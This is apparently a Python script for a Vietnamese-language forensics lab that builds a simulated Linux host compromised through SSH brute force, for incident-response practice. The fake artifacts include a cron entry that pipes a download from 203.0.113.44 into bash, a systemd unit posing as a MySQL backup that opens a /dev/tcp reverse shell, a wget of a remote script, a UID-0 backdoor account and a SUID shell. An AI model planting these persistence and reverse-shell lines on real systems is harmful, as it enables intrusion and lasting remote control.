#!/usr/bin/env python3
# Lab 5.1 - tao bo artifact gia lap cho mot host Linux bi brute force SSH.
# Khong dung du lieu that. Moi thu sinh ra tu kich ban co dinh ben duoi.
#
# Dung: python3 -I make_artifacts.py [thu_muc_dich]
#   mac dinh thu_muc_dich = ./evidence (cay thu muc gia lap cua web01)
#
# Luu y he thong tap tin:
#   - Bit SUID (chmod 4755) chi giu lai tren ext4/xfs that. Tren o Windows
#     mount qua WSL (/mnt/c, /mnt/d, drvfs) bit SUID bi bo, nen chay lab o
#     thu muc Linux that (vi du $HOME) de buoc 8 cua solve.sh thay SUID binary.

import os
import sys
import stat

def w(path, content, mode=0o644):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="\n") as f:
        f.write(content)
    os.chmod(path, mode)

def build_auth_log():
    lines = []
    # mot vai IP nhieu nen cho giong that (so fail nho)
    noise = [
        ("Oct  5 03:11:02", "sshd[1021]", "Failed password for invalid user pi from 192.0.2.7 port 40122 ssh2"),
        ("Oct  5 03:11:02", "sshd[1021]", "Invalid user pi from 192.0.2.7 port 40122"),
        ("Oct  5 07:45:55", "sshd[1340]", "Failed password for root from 198.51.100.9 port 33110 ssh2"),
    ]
    for ts, proc, msg in noise:
        lines.append(f"{ts} web01 {proc}: {msg}")

    # dot brute force chinh tu 203.0.113.44 trong khung 14:21:00 - 14:23:10
    users = ["admin", "test", "oracle", "git", "ubuntu", "postgres", "deploy", "root",
             "user", "ftp", "www", "jenkins", "mysql", "nagios", "backup", "deploy"]
    pid = 2187
    sec = 0
    base_min = 21
    for i, u in enumerate(users):
        mm = base_min + (i * 8) // 60
        ss = (3 + i * 8) % 60
        ts = f"Oct  5 14:{mm:02d}:{ss:02d}"
        port = 51200 + i * 7
        if u in ("root",):
            lines.append(f"{ts} web01 sshd[{pid}]: Failed password for {u} from 203.0.113.44 port {port} ssh2")
        else:
            lines.append(f"{ts} web01 sshd[{pid}]: Invalid user {u} from 203.0.113.44 port {port}")
            lines.append(f"{ts} web01 sshd[{pid}]: Failed password for invalid user {u} from 203.0.113.44 port {port} ssh2")
        pid += 2

    # login thanh cong duy nhat
    lines.append("Oct  5 14:23:11 web01 sshd[2301]: Accepted password for deploy from 203.0.113.44 port 52011 ssh2")
    lines.append("Oct  5 14:23:11 web01 sshd[2301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)")
    # leo thang quyen
    lines.append("Oct  5 14:24:02 web01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/su")
    lines.append("Oct  5 14:24:02 web01 su[2340]: Successful su for root by deploy")
    lines.append("Oct  5 14:24:02 web01 su[2340]: pam_unix(su:session): session opened for user root by deploy(uid=1001)")
    # tao account backdoor
    lines.append("Oct  5 14:25:40 web01 useradd[2401]: new user: name=backup, UID=0, GID=0, home=/root, shell=/bin/bash")
    return "\n".join(lines) + "\n"

def main():
    root = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else "evidence")
    if os.path.exists(root):
        # don sach de chay lai sach se
        import shutil
        shutil.rmtree(root)

    # 1. auth.log
    w(os.path.join(root, "var/log/auth.log"), build_auth_log())

    # 2. bash_history cua deploy (bash khong co timestamp mac dinh)
    w(os.path.join(root, "home/deploy/.bash_history"),
      "id\n"
      "uname -a\n"
      "cat /etc/os-release\n"
      "wget http://203.0.113.44/x.sh\n"
      "chmod +x x.sh\n"
      "./x.sh\n"
      "mkdir -p /tmp/.cache\n"
      "cp /bin/bash /tmp/.cache/sh\n"
      "sudo su\n"
      "history -c\n")

    # root .bash_history bi redirect ve /dev/null (dau anti-forensic)
    linkpath = os.path.join(root, "root/.bash_history")
    os.makedirs(os.path.dirname(linkpath), exist_ok=True)
    try:
        if os.path.lexists(linkpath):
            os.remove(linkpath)
        os.symlink("/dev/null", linkpath)
    except OSError:
        # fs khong cho symlink: de file rong kem ghi chu
        w(linkpath, "")

    # 3. cron drop-in doc hai
    w(os.path.join(root, "etc/crontab"),
      "# /etc/crontab: system-wide crontab\n"
      "SHELL=/bin/sh\n"
      "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
      "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n")
    w(os.path.join(root, "etc/cron.d/apache-backup"),
      "# drop-in la do ke tan cong tha vao\n"
      "*/15 * * * * root curl -fsSL http://203.0.113.44/beacon | bash >/dev/null 2>&1\n")

    # 4. systemd unit + timer gia danh dich vu MySQL (reverse shell)
    w(os.path.join(root, "etc/systemd/system/mysqld-backup.service"),
      "[Unit]\n"
      "Description=MySQL nightly backup helper\n\n"
      "[Service]\n"
      "Type=simple\n"
      "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.44/4444 0>&1'\n"
      "Restart=always\n\n"
      "[Install]\n"
      "WantedBy=multi-user.target\n")
    w(os.path.join(root, "etc/systemd/system/mysqld-backup.timer"),
      "[Unit]\n"
      "Description=Run mysqld-backup every 10 minutes\n\n"
      "[Timer]\n"
      "OnBootSec=2min\n"
      "OnUnitActiveSec=10min\n"
      "Unit=mysqld-backup.service\n\n"
      "[Install]\n"
      "WantedBy=timers.target\n")
    # mot unit hop le de so sanh (khong doc hai)
    w(os.path.join(root, "etc/systemd/system/nginx.service"),
      "[Unit]\n"
      "Description=A high performance web server\n\n"
      "[Service]\n"
      "ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'\n\n"
      "[Install]\n"
      "WantedBy=multi-user.target\n")

    # 5. /etc/passwd voi account backdoor UID 0
    w(os.path.join(root, "etc/passwd"),
      "root:x:0:0:root:/root:/bin/bash\n"
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
      "mysql:x:114:120:MySQL Server:/nonexistent:/bin/false\n"
      "deploy:x:1001:1001::/home/deploy:/bin/bash\n"
      "backup:x:0:0::/root:/bin/bash\n")  # <- UID 0 gia danh "backup"
    w(os.path.join(root, "etc/shadow"),
      "root:$6$rounds=656000$abc$REDACTED:19600:0:99999:7:::\n"
      "deploy:$6$xyz$REDACTED:19600:0:99999:7:::\n"
      "backup:$6$evil$REDACTED:19635:0:99999:7:::\n", mode=0o640)

    # 6. SUID binary trong bai tap ket + mot file an binh thuong
    suid = os.path.join(root, "tmp/.cache/sh")
    w(suid, "#!/bin/sh\n# ban copy /bin/bash gia lap de minh hoa SUID\nexec /bin/sh \"$@\"\n")
    os.chmod(suid, 0o4755)  # set-user-ID
    w(os.path.join(root, "tmp/x.sh"),
      "#!/bin/sh\ncurl -fsSL http://203.0.113.44/stage2 -o /tmp/.cache/stage2\n")
    os.chmod(os.path.join(root, "tmp/x.sh"), 0o755)
    # /dev/shm staging
    w(os.path.join(root, "dev/shm/.scan"), "203.0.113.0/24\n10.0.0.0/8\n")

    # bao cao
    print(f"[+] Da tao cay artifact gia lap tai: {root}")
    suid_ok = bool(os.stat(suid).st_mode & stat.S_ISUID)
    print(f"[+] SUID bit tren {os.path.relpath(suid, os.getcwd())}: "
          f"{'CO (fs ho tro)' if suid_ok else 'MAT (fs khong giu SUID, chay o ext4/xfs)'}")
    print("[+] Chay tiep:  bash solve.sh " + (sys.argv[1] if len(sys.argv) > 1 else "evidence"))

if __name__ == "__main__":
    main()
